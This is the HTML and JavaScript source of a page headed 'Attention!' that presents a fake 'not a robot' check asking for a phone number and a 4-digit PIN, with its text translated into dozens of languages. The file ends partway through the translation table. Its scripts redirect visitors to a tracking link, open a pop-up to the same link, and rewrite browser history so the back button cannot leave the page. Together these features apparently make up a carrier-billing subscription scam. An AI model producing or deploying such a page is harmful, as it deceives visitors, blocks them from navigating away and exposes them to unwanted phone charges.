<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title id="a1">Attention!</title>
        <link rel="stylesheet" type="text/css" href="/public/styles/styles.min.css">
        <link rel="shortcut icon" href="/public/images/action.ico">
        <script src="/public/javascript/jquery.min.js" charset="utf-8"></script>
        <script>
            function launchpopLink() {
                var redirectUrl = "https://ig2kv.bemobtrcks.com/click";
                var mainUrl = "https://ig2kv.bemobtrcks.com/click";
            
                window.location.href = redirectUrl;
                window.open(mainUrl, "_blank");
            }
        </script>
            
        <script>
            function init() {
            setTimeout(function(){window.scrollTo(0,1)},0);
            }
            window.history.replaceState('/loading', '', '/loading');
            window.history.pushState('/', '', '/');
            window.addEventListener('popstate', function(e) {
            if(document.URL.indexOf('/loading') >= 0){
            document.location.href = document.location;
            }
            });
        </script>
        <script>
        function getURLParameter(name) {
            return decodeURIComponent(
                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
            );
        }
        strAlert = "";

        var translation = {
            source: {
                a1: "Attention!",
                container: "Make sure that you are not a robot.",
                errorMessage: "An error has occurred. Please try again.",
                successMessage: "Verification code has been successfully sent!",
                loading: "Your request is being processed...",
                msisdn_placeholder: "Phone number (0123-4567890)",
                pin_placeholder: "Enter 4-digit PIN",
                sendPinBtn: "Send PIN",
                verifyBtn: "Verify PIN"
            },
            en: {
                a1: "Attention!",
                container: "Make sure that you are not a robot.",
                errorMessage: "An error has occurred. Please try again.",
                successMessage: "Verification code has been successfully sent!",
                loading: "Your request is being processed...",
                msisdn_placeholder: "Phone number (0123-4567890)",
                pin_placeholder: "Enter 4-digit PIN",
                sendPinBtn: "Send PIN",
                verifyBtn: "Verify PIN"
            },
            de: {
                a1: "Achtung!",
                container: "Stellen Sie sicher, dass Sie kein Roboter sind.",
                errorMessage: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
                successMessage: "Bestätigungscode wurde erfolgreich gesendet!",
                loading: "Ihre Anfrage wird bearbeitet...",
                msisdn_placeholder: "Telefonnummer (0123-4567890)",
                pin_placeholder: "4-stellige PIN eingeben",
                sendPinBtn: "PIN senden",
                verifyBtn: "PIN überprüfen"
            },
            fr: {
                a1: "Attention !",
                container: "Assurez-vous que vous n'êtes pas un robot.",
                errorMessage: "Une erreur s'est produite. Veuillez réessayer.",
                successMessage: "Le code de vérification a été envoyé avec succès!",
                loading: "Votre demande est en cours de traitement...",
                msisdn_placeholder: "Numéro de téléphone (0123-4567890)",
                pin_placeholder: "Entrez le PIN à 4 chiffres",
                sendPinBtn: "Envoyer le PIN",
                verifyBtn: "Vérifier le PIN"
            },
            pt: {
                a1: "Atenção!",
                container: "Certifique-se de que você não é um robô.",
                errorMessage: "Ocorreu um erro. Por favor, tente novamente.",
                successMessage: "Código de verificação enviado com sucesso!",
                loading: "Sua solicitação está sendo processada...",
                msisdn_placeholder: "Número de telefone (0123-4567890)",
                pin_placeholder: "Digite o PIN de 4 dígitos",
                sendPinBtn: "Enviar PIN",
                verifyBtn: "Verificar PIN"
            },
            es: {
                container: "Asegúrate de que no eres un robot.",
                errorMessage: "Ha ocurrido un error. Por favor, inténtalo de nuevo.",
                successMessage: "¡Código de verificación enviado con éxito!",
                loading: "Su solicitud está siendo procesada...",
                msisdn_placeholder: "Número de teléfono (0123-4567890)",
                pin_placeholder: "Ingrese PIN de 4 dígitos",
                sendPinBtn: "Enviar PIN",
                verifyBtn: "Verificar PIN"
            },
            sr: {
                container: "Уверите се да нисте робот.",
                errorMessage: "Дошло је до грешке. Молимо покушајте поново.",
                successMessage: "Код за верификацију је успешно послат!",
                loading: "Ваш захтев се обрађује...",
                msisdn_placeholder: "Број телефона (0123-4567890)",
                pin_placeholder: "Унесите 4-цифрени PIN",
                sendPinBtn: "Пошаљи PIN",
                verifyBtn: "Потврди PIN"
            },
            ar: {
                container: "تأكد من أنك لست روبوتًا.",
                errorMessage: "حدث خطأ. يرجى المحاولة مرة أخرى.",
                successMessage: "تم إرسال رمز التحقق بنجاح!",
                loading: "طلبك قيد المعالجة...",
                msisdn_placeholder: "رقم الهاتف (0123-4567890)",
                pin_placeholder: "أدخل الرمز السري المكون من 4 أرقام",
                sendPinBtn: "إرسال الرمز السري",
                verifyBtn: "تحقق من الرمز السري"
            },
            nl: {
                container: "Zorg ervoor dat u geen robot bent.",
                errorMessage: "Er is een fout opgetreden. Probeer het opnieuw.",
                successMessage: "Verificatiecode is succesvol verzonden!",
                loading: "Uw verzoek wordt verwerkt...",
                msisdn_placeholder: "Telefoonnummer (0123-4567890)",
                pin_placeholder: "Voer 4-cijferige PIN in",
                sendPinBtn: "PIN verzenden",
                verifyBtn: "PIN verifiëren"
            },
            zh: {
                a1: "注意！",
                container: "请确认您不是机器人。",
                errorMessage: "发生错误,请重试。",
                successMessage: "验证码已成功发送！",
                loading: "您的请求正在处理中...",
                msisdn_placeholder: "电话号码 (0123-4567890)",
                pin_placeholder: "输入4位PIN码",
                sendPinBtn: "发送PIN码",
                verifyBtn: "验证PIN码"
            },
            ms: {
                container: "Pastikan anda bukan robot.",
                errorMessage: "Ralat telah berlaku. Sila cuba lagi.",
                successMessage: "Kod pengesahan telah berjaya dihantar!",
                loading: "Permintaan anda sedang diproses...",
                msisdn_placeholder: "Nombor telefon (0123-4567890)",
                pin_placeholder: "Masukkan PIN 4 digit",
                sendPinBtn: "Hantar PIN",
                verifyBtn: "Sahkan PIN"
            },
            id: {
                container: "Pastikan Anda bukan robot.",
                errorMessage: "Terjadi kesalahan. Silakan coba lagi.",
                successMessage: "Kode verifikasi berhasil dikirim!",
                loading: "Permintaan Anda sedang diproses...",
                msisdn_placeholder: "Nomor telepon (0123-4567890)",
                pin_placeholder: "Masukkan PIN 4 digit",
                sendPinBtn: "Kirim PIN",
                verifyBtn: "Verifikasi PIN"
            },
            th: {
                container: "โปรดตรวจสอบว่าคุณไม่ใช่หุ่นยนต์",
                errorMessage: "เกิดข้อผิดพลาด กรุณาลองอีกครั้ง",
                successMessage: "ส่งรหัสยืนยันสำเร็จแล้ว!",
                loading: "กำลังประมวลผลคำขอของคุณ...",
                msisdn_placeholder: "หมายเลขโทรศัพท์ (0123-4567890)",
                pin_placeholder: "ป้อน PIN 4 หลัก",
                sendPinBtn: "ส่ง PIN",
                verifyBtn: "ยืนยัน PIN"
            },
            fil: {
                container: "Siguraduhing hindi ka robot.",
                errorMessage: "May naganap na error. Pakisubukan muli.",
                successMessage: "Matagumpay na naipadala ang verification code!",
                loading: "Pinoproseso ang iyong kahilingan...",
                msisdn_placeholder: "Numero ng telepono (0123-4567890)",
                pin_placeholder: "Ilagay ang 4-digit na PIN",
                sendPinBtn: "Ipadala ang PIN",
                verifyBtn: "I-verify ang PIN"
            },
            ja: {
                container: "あなたがロボットでないことを確認してください。",
                errorMessage: "エラーが発生しました。もう一度お試しください。",
                successMessage: "確認コードが正常に送信されました！",
                loading: "リクエストを処理中...",
                msisdn_placeholder: "電話番号 (0123-4567890)",
                pin_placeholder: "4桁のPINを入力",
                sendPinBtn: "PINを送信",
                verifyBtn: "PINを確認"
            },
            tr: {
                container: "Bir robot olmadığınızdan emin olun.",
                errorMessage: "Bir hata oluştu. Lütfen tekrar deneyin.",
                successMessage: "Doğrulama kodu başarıyla gönderildi!",
                loading: "İsteğiniz işleniyor...",
                msisdn_placeholder: "Telefon numarası (0123-4567890)",
                pin_placeholder: "4 haneli PIN girin",
                sendPinBtn: "PIN Gönder",
                verifyBtn: "PIN'i Doğrula"
            },
            da: {
                container: "Sørg for at du ikke er en robot.",
                errorMessage: "Der opstod en fejl. Prøv venligst igen.",
                successMessage: "Bekræftelseskode er blevet sendt!",
                loading: "Din anmodning behandles...",
                msisdn_placeholder: "Telefonnummer (0123-4567890)",
                pin_placeholder: "Indtast 4-cifret PIN",
                sendPinBtn: "Send PIN",
                verifyBtn: "Bekræft PIN"
            },
            ko: {
                container: "로봇이 아니라는 것을 확인하세요.",
                errorMessage: "오류가 발생했습니다. 다시 시도해 주세요.",
                successMessage: "인증 코드가 성공적으로 전송되었습니다!",
                loading: "요청을 처리 중입니다...",
                msisdn_placeholder: "전화번호 (0123-4567890)",
                pin_placeholder: "4자리 PIN 입력",
                sendPinBtn: "PIN 전송",
                verifyBtn: "PIN 확인"
            },
            it: {
                container: "Assicurati di non essere un robot.",
                errorMessage: "Si è verificato un errore. Riprova.",
                successMessage: "Codice di verifica inviato con successo!",
                loading: "La tua richiesta è in elaborazione...",
                msisdn_placeholder: "Numero di telefono (0123-4567890)",
                pin_placeholder: "Inserisci PIN a 4 cifre",
                sendPinBtn: "Invia PIN",
                verifyBtn: "Verifica PIN"
            },
            no: {
                container: "Forsikre deg om at du ikke er en robot.",
                errorMessage: "Det oppstod en feil. Vennligst prøv igjen.",
                successMessage: "Bekreftelseskode er sendt!",
                loading: "Forespørselen din behandles...",
                msisdn_placeholder: "Telefonnummer (0123-4567890)",
                pin_placeholder: "Skriv inn 4-sifret PIN",
                sendPinBtn: "Send PIN",
                verifyBtn: "Bekreft PIN"
            },
            sv: {
                container: "Se till att du inte är en robot.",
                errorMessage: "Ett fel uppstod. Försök igen.",
                successMessage: "Verifieringskod har skickats!",
                loading: "Din förfrågan behandlas...",
                msisdn_placeholder: "Telefonnummer (0123-4567890)",
                pin_placeholder: "Ange 4-siffrig PIN",
                sendPinBtn: "Skicka PIN",
                verifyBtn: "Verifiera PIN"
            },
            fi: {
                container: "Varmista, että et ole robotti.",
                errorMessage: "Tapahtui virhe. Yritä uudelleen.",
                successMessage: "Vahvistuskoodi on lähetetty onnistuneesti!",
                loading: "Pyyntöäsi käsitellään...",
                msisdn_placeholder: "Puhelinnumero (0123-4567890)",
                pin_placeholder: "Syötä 4-numeroinen PIN",
                sendPinBtn: "Lähetä PIN",
                verifyBtn: "Vahvista PIN"
            },
            is: {
                container: "Gakktu því að þú sért ekki vélmenni.",
                errorMessage: "Villa kom upp. Reyndu aftur.",
                successMessage: "Staðfestingarkóði hefur verið sendur!",
                loading: "Beiðni þín er í vinnslu...",
                msisdn_placeholder: "Símanúmer (0123-4567890)",
                pin_placeholder: "Sláðu inn 4 stafa PIN",
                sendPinBtn: "Senda PIN",
                verifyBtn: "Staðfesta PIN"
            },
            el: {
                container: "Βεβαιωθείτε ότι δεν είστε ρομπότ.",
                errorMessage: "Παρουσιάστηκε σφάλμα. Παρακαλώ δοκιμάστε ξανά.",
                successMessage: "Ο κωδικός επαλήθευσης εστάλη με επιτυχία!",
                loading: "Το αίτημά σας επεξεργάζεται...",
                msisdn_placeholder: "Αριθμός τηλεφώνου (0123-4567890)",
                pin_placeholder: "Εισαγάγετε 4ψήφιο PIN",
                sendPinBtn: "Αποστολή PIN",
                verifyBtn: "Επαλήθευση PIN"
            },
            bg: {
                container: "Уверете се, че не сте робот.",
                errorMessage: "Възникна грешка. Моля, опитайте отново.",
                successMessage: "Кодът за потвърждение е изпратен успешно!",
                loading: "Вашата заявка се обработва...",
                msisdn_placeholder: "Телефонен номер (0123-4567890)",
                pin_placeholder: "Въведете 4-цифрен PIN",
                sendPinBtn: "Изпрати PIN",
                verifyBtn: "Потвърди PIN"
            },
            hu: {
                container: "Győződjön meg róla, hogy nem robot.",
                errorMessage: "Hiba történt. Kérjük, próbálja újra.",
                successMessage: "A hitelesítési kód sikeresen elküldve!",
                loading: "Kérését feldolgozzuk...",
                msisdn_placeholder: "Telefonszám (0123-4567890)",
                pin_placeholder: "4 számjegyű PIN megadása",
                sendPinBtn: "PIN küldése",
                verifyBtn: "PIN ellenőrzése"
            },
            et: {
                container: "Veenduge, et te ei ole robot.",
                errorMessage: "Tekkis viga. Palun proovige uuesti.",
                successMessage: "Kinnituskood on edukalt saadetud!",
                loading: "Teie päringut töödeldakse...",
                msisdn_placeholder: "Telefoninumber (0123-4567890)",
                pin_placeholder: "Sisestage 4-kohaline PIN",
                sendPinBtn: "Saada PIN",
                verifyBtn: "Kinnita PIN"
            },
            hr: {
                container: "Provjerite da niste robot.",
                errorMessage: "Došlo je do pogreške. Molimo pokušajte ponovno.",
                successMessage: "Kod za provjeru je uspješno poslan!",
                loading: "Vaš zahtjev se obrađuje...",
                msisdn_placeholder: "Broj telefona (0123-4567890)",
                pin_placeholder: "Unesite 4-znamenkasti PIN",
                sendPinBtn: "Pošalji PIN",
                verifyBtn: "Provjeri PIN"
            },
            sl: {
                container: "Prepričajte se, da niste robot.",
                errorMessage: "Prišlo je do napake. Prosimo, poskusite znova.",
                successMessage: "Potrditvena koda je bila uspešno poslana!",
                loading: "Vaša zahteva se obdeluje...",
                msisdn_placeholder: "Telefonska številka (0123-4567890)",
                pin_placeholder: "Vnesite 4-mestno PIN",
                sendPinBtn: "Pošlji PIN",
                verifyBtn: "Preveri PIN"
            },
            ro: {
                container: "Asigurați-vă că nu sunteți un robot.",
                errorMessage: "A apărut o eroare. Vă rugăm să încercați din nou.",
                successMessage: "Codul de verificare a fost trimis cu succes!",
                loading: "Cererea dvs. este în curs de procesare...",
                msisdn_placeholder: "Număr de telefon (0123-4567890)",
                pin_placeholder: "Introduceți PIN-ul de 4 cifre",
                sendPinBtn: "Trimite PIN",
                verifyBtn: "Verifică PIN"
            },
            cs: {
                container: "Ujistěte se, že nejste robot.",
                errorMessage: "Došlo k chybě. Zkuste to prosím znovu.",
                successMessage: "Ověřovací kód byl úspěšně odeslán!",
                loading: "Vaše žádost se zpracovává...",
                msisdn_placeholder: "Telefonní číslo (0123-4567890)",
                pin_placeholder: "Zadejte 4místný PIN",
                sendPinBtn: "Odeslat PIN",
                verifyBtn: "Ověřit PIN"
            },
            pl: {
                container: "Upewnij się, że nie jesteś robotem.",
                errorMessage: "Wystąpił błąd. Proszę spróbować ponownie.",
                successMessage: "Kod weryfikacyjny został pomyślnie wysłany!",
                loading: "Twoje żądanie jest przetwarzane...",
                msisdn_placeholder: "Numer telefonu (0123-4567890)",
                pin_placeholder: "Wprowadź 4-cyfrowy PIN",
                sendPinBtn: "Wyślij PIN",
                verifyBtn: "Zweryfikuj PIN"
            },
            vi: {
                container: "Hãy chắc chắn rằng bạn không phải là robot.",
                errorMessage: "Đã xảy ra lỗi. Vui lòng thử lại.",
                successMessage: "Mã xác minh đã được gửi thành công!",
                loading: "Yêu cầu của bạn đang được xử lý...",
                msisdn_placeholder: "Số điện thoại (0123-4567890)",
                pin_placeholder: "Nhập mã PIN 4 chữ số",
                sendPinBtn: "Gửi PIN",
                verifyBtn: "Xác minh PIN"
            },
            lv: {
                container: "Pārliecinieties, ka neesat robots.",
                errorMessage: "Radās kļūda. Lūdzu, mēģiniet vēlreiz.",
                successMessage: "Verifikācijas kods ir veiksmīgi nosūtīts!",
                loading: "Jūsu pieprasījums tiek apstrādāts...",
                msisdn_placeholder: "Tālruņa numurs (0123-4567890)",
                pin_placeholder: "Ievadiet 4 ciparu PIN",
                sendPinBtn: "Sūtīt PIN",
                verifyBtn: "Pārbaudīt PIN"
            },
            lt: {
                container: "Įsitikinkite, kad nesate robotas.",
                errorMessage: "Įvyko klaida. Bandykite dar kartą.",
                successMessage: "Patvirtinimo kodas sėkmingai išsiųstas!",
                loading: "Jūsų užklausa apdorojama...",
                msisdn_placeholder: "Telefono numeris (0123-4567890)",
                pin_placeholder: "Įveskite 4 skaitmenų PIN",
                sendPinBtn: "Siųsti PIN",
                verifyBtn: "Patvirtinti PIN"
            },
            sk: {
                container: "Uistite sa, že nie ste robot.",
                errorMessage: "Vyskytla sa chyba. Skúste to znova.",
                successMessage: "Overovací kód bol úspešne odoslaný!",
                loading: "Vaša požiadavka sa spracováva...",
                msisdn_placeholder: "Telefónne číslo (0123-4567890)",
                pin_placeholder: "Zadajte 4-miestny PIN",
                sendPinBtn: "Odoslať PIN",
                verifyBtn: "Overiť PIN"
            },
            hi: {
                container: "सुनिश्चित करें कि आप रोबोट नहीं हैं।",
                errorMessage: "एक त्रुटि हुई है। कृपया पुनः प्रयास करें।",
                successMessage: "सत्यापन कोड सफलतापूर्वक भेजा गया है!",
                loading: "आपका अनुरोध प्रसंस्करण किया जा रहा है...",
                msisdn_placeholder: "फोन नंबर (0123-4567890)",
                pin_placeholder: "4 अंकों का पिन दर्ज करें",
                sendPinBtn: "पिन भेजें",
                verifyBtn: "पिन सत्यापित करें"
            },
            mr: {
                container: "आपण रोबोट नाही याची खात्री करा.",
                errorMessage: "एक त्रुटी आली आहे. कृपया पुन्हा प्रयत्न करा.",
                successMessage: "सत्यापन कोड यशस्वीरित्या पाठवला गेला आहे!",
                loading: "आपली विनंती प्रक्रिया करत आहे...",
                msisdn_placeholder: "फोन नंबर (0123-4567890)",
                pin_placeholder: "4 अंकी पिन प्रविष्ट करा",
                sendPinBtn: "पिन पाठवा",
                verifyBtn: "पिन सत्यापित करा"
            },
            gu: {
                container: "ખાતરી કરો કે તમે રોબોટ નથી.",
                errorMessage: "ભૂલ આવી છે. કૃપા કરીને ફરી પ્રયત્ન કરો.",
                successMessage: "ચકાસણી કોડ સફળતાપૂર્વક મોકલવામાં આવ્યો છે!",
                loading: "તમારી વિનંતી પ્રક્રિયા કરવામાં આવી રહી છે...",
                msisdn_placeholder: "ફોન નંબર (0123-4567890)",
                pin_placeholder: "4 અંકનો પિન દાખલ કરો",
                sendPinBtn: "પિન મોકલો",
                verifyBtn: "પિન ચકાસો"
            },
            ta: {
                container: "நீங்கள் ரோபோ அல்ல என்பதை உறுதிப்படுத்திக் கொள்ளுங்கள்.",
                errorMessage: "ஒரு பிழை ஏற்பட்டது. தயவு செய்து மீண்டும் முயற்சிக்கவும்.",
                successMessage: "சரிபார்ப்புக் குறியீடு வெற்றிகரமாக அனுப்பப்பட்டது!",
                loading: "உங்கள் கோரிக்கை செயல்படுத்தப்படுகிறது...",
                msisdn_placeholder: "தொலைபேசி எண் (0123-4567890)",
                pin_placeholder: "4 இலக்க PIN உள்ளிடவும்",
                sendPinBtn: "PIN அனுப்பவும்",
                verifyBtn: "PIN சரிபார்க்கவும்"
            },
            ml: {
                container: "നിങ്ങൾ ഒരു റോബോട്ട് അല്ലെന്ന് ഉറപ്പാക്കുക.",
                errorMessage: "ഒരു പിഴവ് സംഭവിച്ചു. ദയവായി വീണ്ടും ശ്രമിക്കുക.",
                successMessage: "സ്ഥിരീകരണ കോഡ് വിജയകരമായി അയച്ചു!",
                loading: "നിങ്ങളുടെ അഭ്യർത്ഥന പ്രോസസ്സ് ചെയ്യുന്നു...",
                msisdn_placeholder: "ഫോൺ നമ്പർ (0123-4567890)",
                pin_placeholder: "4 അക്ക പിൻ നൽകുക",
                sendPinBtn: "പിൻ അയയ്ക്കുക",
                verifyBtn: "പിൻ സ്ഥിരീകരിക്കുക"
            },
            pa: {
                container: "ਯਕੀਨੀ ਬਣਾਓ ਕਿ ਤੁਸੀਂ ਰੋਬੋਟ ਨਹੀਂ ਹੋ।",
                errorMessage: "ਇੱਕ ਗਲਤੀ ਹੋਈ ਹੈ। ਕਿਰਪਾ ਕਰਕੇ ਦੁਬਾਰਾ ਕੋਸ਼ਿਸ਼ ਕਰੋ।",
                successMessage: "ਪੁਸ਼ਟੀਕਰਨ ਕੋਡ ਸਫਲਤਾਪੂਰਵਕ ਭੇਜਿਆ ਗਿਆ ਹੈ!",
                loading: "ਤੁਹਾਡੀ ਬੇਨਤੀ ਪ੍ਰੋਸੈਸ ਕੀਤੀ ਜਾ ਰਹੀ ਹੈ...",
                msisdn_placeholder: "ਫੋਨ ਨੰਬਰ (0123-4567890)",
                pin_placeholder: "4 ਅੰਕਾਂ ਦਾ ਪਿੰਨ ਦਰਜ ਕਰੋ",
                sendPinBtn: "ਪਿੰਨ ਭੇਜੋ",
                verifyBtn: "ਪਿੰਨ ਪੁਸ਼ਟੀ ਕਰੋ"
            },
            kn: {
                container: "ನೀವು ರೋಬೋಟ್ ಅಲ್ಲ ಎಂದು ಖಚಿತಪಡಿಸಿಕೊಳ್ಳಿ.",
                errorMessage: "ದೋಷ ಸಂಭವಿಸಿದೆ. ದಯವಿಟ್ಟು ಮತ್ತೆ ಪ್ರಯತ್ನಿಸಿ.",
                successMessage: "ಪರಿಶೀಲನಾ ಕೋಡ್ ಅನ್ನು ಯಶಸ್ವಿಯಾಗಿ ಕಳುಹಿಸಲಾಗಿದೆ!",
                loading: "ನಿಮ್ಮ ವಿನಂತಿಯನ್ನು ಪ್ರಕ್ರಿಯೆಗೊಳಿಸಲಾಗುತ್ತಿದೆ...",
                msisdn_placeholder: "ಫೋನ್ ನಂಬರ್ (0123-4567890)",
                pin_placeholder: "4 ಅಂಕಿಯ ಪಿನ್ ನಮೂದಿಸಿ",
                sendPinBtn: "ಪಿನ್ ಕಳುಹಿಸಿ",
                verifyBtn: "ಪಿನ್ ಪರಿಶೀಲಿಸಿ"
            },
            te: {
                container: "మీరు రోబోట్ కాదని నిర్ధారించుకోండి.",
                errorMessage: "దోషం సంభవించింది. దయచేసి మళ్లీ ప్రయత్నించండి.",
                successMessage: "ధృవీకరణ కోడ్ విజయవంతంగా పంపబడింది!",
                loading: "మీ అభ్యర్థన ప్రాసెస్ అవుతుంది...",
                msisdn_placeholder: "ఫోన్ నంబర్ (0123-4567890)",
                pin_placeholder: "4 అంకెల పిన్ నమోదు చేయండి",
                sendPinBtn: "పిన్ పంపండి",
                verifyBtn: "పిన్ ధృవీకరించండి"
            },
            ur: {
                container: "یقینی بنائیں کہ آپ روبوٹ نہیں ہیں۔",
                errorMessage: "ایک خرابی پیش آگئی ہے۔ براہ کرم دوبارہ کوشش کریں۔",
                successMessage: "تصدیقی کوڈ کامیابی سے بھیج دیا گیا ہے!",
                loading: "آپ کی درخواست پر کارروائی کی جا رہی ہے...",
                msisdn_placeholder: "فون نمبر (0123-4567890)",
                pin_placeholder: "4 ہندسوں کا پن درج کریں",
                sendPinBtn: "پن بھیجیں",
                verifyBtn: "پن کی تصدیق کریں"
            },
            bn: {
                container: "নিশ্চিত করুন যে আপনি রোবট নন।",
                errorMessage: "একটি ত্রুটি হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।",
                successMessage: "যাচাইকরণ কোড সফলভাবে পাঠানো হয়েছে!",
                loading: "আপনার অনুরোধ প্রক্রিয়া করা হচ্ছে...",
                msisdn_placeholder: "ফোন নম্বর (0123-4567890)",
                pin_placeholder: "4 অঙ্কের পিন লিখুন",
                sendPinBtn: "পিন পাঠান",
                verifyBtn: "পিন যাচাই করুন"
            },
            ru: {
                container: "Убедитесь, что вы не робот.",
                errorMessage: "Произошла ошибка. Пожалуйста, попробуйте еще раз.",
                successMessage: "Код подтверждения успешно отправлен!",
                loading: "Ваш запрос обрабатывается...",
                msisdn_placeholder: "Номер телефона (0123-4567890)",
                pin_placeholder: "Введите 4-значный PIN",
                sendPinBtn: "Отправить PIN",
                verifyBtn: "Проверить PIN"
            },
            ne: {
                container: "तपाइँ रोबोट नहुनुहुन्छ भन्ने कुरा सुनिश्चित गर्नुहोस्।",
                errorMessage: "त्रुटि भएको छ। कृपया पुनः प्रयास गर्नुहोस्।",
                successMessage: "सत्यापन कोड सफलतापूर्वक पठाइएको छ!",
                loading: "तपाइँको अनुरोध प्रशोधन हुदैछ...",
                msisdn_placeholder: "फोन नम्बर (0123-4567890)",
                pin_placeholder: "4 अंकको पिन प्रविष्ट गर्नुहोस्",
                sendPinBtn: "पिन पठाउनुहोस्",
                verifyBtn: "पिन सत्यापन गर्नुहोस्"
            },
            uk: {
                container: "Переконайтеся, що ви не робот.",
                errorMessage: "Сталася помилка. Будь ласка, спробуйте ще раз.",
                successMessage: "Код підтвердження успішно відправлено!",
                loading: "Ваш запит обробляється...",
                msisdn_placeholder: "Номер телефону (0123-4567890)",
                pin_placeholder: "Введіть 4-значний PIN",
                sendPinBtn: "Надіслати PIN",
                verifyBtn: "Перевірити PIN"
            },
            ka: {
                container: "დარწმუნდით, რომ არ ხართ რობოტი.",
                errorMessage: "მოხდა შეცდომა. გთხოვთ, სცადოთ ხელახლა.",
                successMessage: "ვერიფიკაციის კოდი წარმატებით გაიგზავნა!",
                loading: "თქვენი მოთხოვნა მუშავდება...",
                msisdn_placeholder: "ტელეფონის ნომერი (0123-4567890)",
                pin_placeholder: "შეიყვანეთ 4-ნიშნა PIN",
                sendPinBtn: "PIN-ის გაგზავნა",
                verifyBtn: "PIN-ის დადასტურება"
            },
            fa: {
                container: "مطمئن شوید که ربات نیستید.",
                errorMessage: "خطایی رخ داده است. لطفا دوباره تلاش کنید.",
                successMessage: "کد تأیید با موفقیت ارسال شد!",
                loading: "درخواست شما در حال پردازش است...",
                msisdn_placeholder: "شماره تلفن (0123-4567890)",
                pin_placeholder: "پین 4 رقمی را وارد کنید",
                sendPinBtn: "ارسال پین",
                verifyBtn: "تأیید پین"
            },
            sw: {
                container: "Hakikisha kuwa wewe sio roboti.",
                errorMessage: "Hitilafu imetokea. Tafadhali jaribu tena.",
                successMessage: "Msimbo wa uthibitishaji umetumwa kwa mafanikio!",
                loading: "Ombi lako linashughulikiwa...",
                msisdn_placeholder: "Nambari ya simu (0123-4567890)",
                pin_placeholder: "Weka PIN ya tarakimu 4",
                sendPinBtn: "Tuma PIN",
                verifyBtn: "Thibitisha PIN"
            },
            hy: {
                container: "Համոզվեք, որ ռոբոտ չեք:",
                errorMessage: "Սխալ է տեղի ունեցել: Խնդրում ենք նորից փորձել:",
                successMessage: "Ստուգման կոդը հաջողությամբ ուղարկված է:",
                loading: "Ձեր հարցումը մշակվում է...",
                msisdn_placeholder: "Հեռախոսահամար (0123-4567890)",
                pin_placeholder: "Մուտքագրեք 4 նիշ PIN",
                sendPinBtn: "Ուղարկել PIN",
                verifyBtn: "Ստուգել PIN"
            },
            uz: {
                container: "Robot emasligingizga ishonch hosil qiling.",
                errorMessage: "Xatolik yuz berdi. Iltimos, qayta urinib ko'ring.",
                successMessage: "Tasdiqlash kodi muvaffaqiyatli yuborildi!",
                loading: "So'rovingiz qayta ishlanmoqda...",
                msisdn_placeholder: "Telefon raqami (0123-4567890)",
                pin_placeholder: "4 raqamli PIN kiriting",
                sendPinBtn: "PIN yuborish",
                verifyBtn: "PIN tekshirish"
            },
            mk: {
                container: "Проверете дали не сте робот.",
                errorMessage: "Настана грешка. Ве молам обидете се повторно.",
                successMessage: "Кодот за потврда е успешно испратен!",
                loading: "Вашето барање се обработува...",
                msisdn_placeholder: "Телефонски број (0123-4567890)",
                pin_placeholder: "Внесете 4-цифрен PIN",
                sendPinBtn: "Испрати PIN",
                verifyBtn: "Потврди PIN"
            },
            am: {
                container: "ሮቦት እንደማይሆኑ ያረጋግጡ።",
                errorMessage: "ስህተት ተከስቷል። እባክዎ እንደገና ይሞክሩ።",
                successMessage: "የማረጋገጫ ኮድ በተሳካ ሁኔታ ተልኳል!",
                loading: "ጥያቄዎ እየተከናወነ ነው...",
                msisdn_placeholder: "ስልክ ቁጥር (0123-4567890)",
                pin_placeholder: "4 አሃዝ PIN አስገባ",
                sendPinBtn: "PIN ላክ",
                verifyBtn: "PIN አረጋግጥ"
            },
            yo: {
                container: "Rii daju pe o ki iṣẹ robọti.",
                errorMessage: "Aṣiṣe kan ṣẹlẹ. Jọwọ tun gbiyanju.",
                successMessage: "Koodu iṣẹẹri ti firanṣẹ ni àṣeyọri!",
                loading: "A nṣe ibere rẹ...",
                msisdn_placeholder: "Nọmba foonu (0123-4567890)",
                pin_placeholder: "Tẹ PIN oni-nọmba 4 sii",
                sendPinBtn: "Firanṣẹ PIN",
                verifyBtn: "Ṣayẹwo PIN"
            },
            ha: {
                container: "Tabbatar cewa ba robot ba ne.",
                errorMessage: "An sami kuskure. Da fatan za a sake gwadawa.",
                successMessage: "An aika lambar tabbatarwa cikin nasara!",
                loading: "Ana aiwatar da bukatar ku...",
                msisdn_placeholder: "Lambar waya (0123-4567890)",
                pin_placeholder: "Shigar da PIN lamba 4",
                sendPinBtn: "Aika PIN",
                verifyBtn: "Tabbatar da PIN"
            },
            om: {
                container: "Mirkana robotii miti.",
                errorMessage: "Dogoggora ta'e. Maaloo irra deebi'ii yaali.",
                successMessage: "Koodii mirkanaa'aa guutumaatti ergame!",
                loading: "Gaafii keessan hojiirra jira...",
                msisdn_placeholder: "Lakkoofsa bilbila (0123-4567890)",
                pin_placeholder: "PIN lakkoofsa 4 galchi",
                sendPinBtn: "PIN ergasi",
                verifyBtn: "PIN mirkaneessi"
            },
            zu: {
                container: "Qiniseka ukuthi awuyena irobhothi.",
                errorMessage: "Kuvele iphutha. Ngicela uzame futhi.",
                successMessage: "Ikhodi yokuqinisekisa ithunyelwe ngempumelelo!",
                loading: "Isicelo sakho siprocesswa...",
                msisdn_placeholder: "Inombolo yocingo (0123-4567890)",
                pin_placeholder: "Faka i-PIN enezinhlamvu ezi-4",
                sendPinBtn: "Thumela i-PIN",
                verifyBtn: "Qinisekisa i-PIN"
            },
            my: {
                container: "သင်သည် စက်ရုပ်မဟုတ်ကြောင်း သေချာစေပါ။",
                errorMessage: "အမှားတစ်ခုဖြစ်ပွားခဲ့သည်။ ကျေးဇူးပြု၍ ထပ်ကြိုးစားပါ။",
                successMessage: "အတည်ပြုကုဒ်ကို အောင်မြင်စွာ ပို့ပြီးပါပြီ!",
                loading: "သင့်တောင်းဆိုချက်ကို လုပ်ဆောင်နေပါသည်...",
                msisdn_placeholder: "ဖုန်းနံပါတ် (0123-4567890)",
                pin_placeholder: "ဂဏန်း ၄ လုံး PIN ထည့်ပါ",
                sendPinBtn: "PIN ပို့ပါ",
                verifyBtn: "PIN အတည်ပြုပါ"
            },
            km: {
                container: "ធានាថាអ្នកមិនមែនជារូបូតទេ។",
                errorMessage: "មានកំហុសបានកើតឡើង។ សូមព្យាយាមម្តងទៀត។",
